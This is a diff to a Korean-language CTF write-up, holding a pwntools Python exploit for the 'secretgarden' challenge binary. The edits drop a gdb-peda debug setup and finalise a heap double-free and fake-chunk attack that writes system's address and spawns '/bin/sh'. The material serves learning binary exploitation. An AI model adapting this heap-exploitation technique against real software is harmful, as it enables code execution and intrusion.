@@ -40,9 +40,7 @@ exploit은 아래와 같이 할 수 있다.
 #!/usr/bin/env python
 from pwn import *
 
-conn = process(["gdb-peda", "./secretgarden"])
-conn.sendline("b *0x0400F22")
-conn.sendline("r")
+conn = process("./secretgarden")
 
 def raiseflower(length,name,color):
     conn.recvuntil(":")
@@ -168,8 +166,8 @@ else:
     log.info("puts_addr : " + hex(puts_addr))
 
     # double free
-    raiseflower(0x60, "A"*0x60, "A") #3
-    raiseflower(0x60, "A"*0x60, "B") #4
+    raiseflower(0x50, "A"*0x60, "A") #3
+    raiseflower(0x50, "A"*0x60, "B") #4
 
     remove(3)
     remove(4)
@@ -189,12 +187,12 @@ else:
     log.info("system_addr : " + hex(system_addr))
     log.info("fake_chunk  : " + hex(fake_chunk))
 
-    raiseflower(0x60, p64(fake_chunk)+"\n", "A") #3
-    raiseflower(0x60, "/bin/sh\x00"+"\n", "B") #4
-    raiseflower(0x60, "A"*0x60, "B") 
-    #raiseflower(0x50, "A"*6+p64(0)+p64(system_addr), "B")
+    raiseflower(0x50, p64(fake_chunk)+"\n", "A") #3
+    raiseflower(0x50, "/bin/sh\x00"+"\n", "B") #4
+    raiseflower(0x50, "A"*0x50, "B") 
+    raiseflower(0x50, "A"*6+p64(0)+p64(system_addr), "B")
     
-    #remove(4)
+    remove(4)
     """
     conn.recvuntil("Baby Secret Garden")
     magic = 0x400c7b
@@ -211,7 +209,6 @@ else:
     """
 
 conn.interactive()
-
 ```
 
 
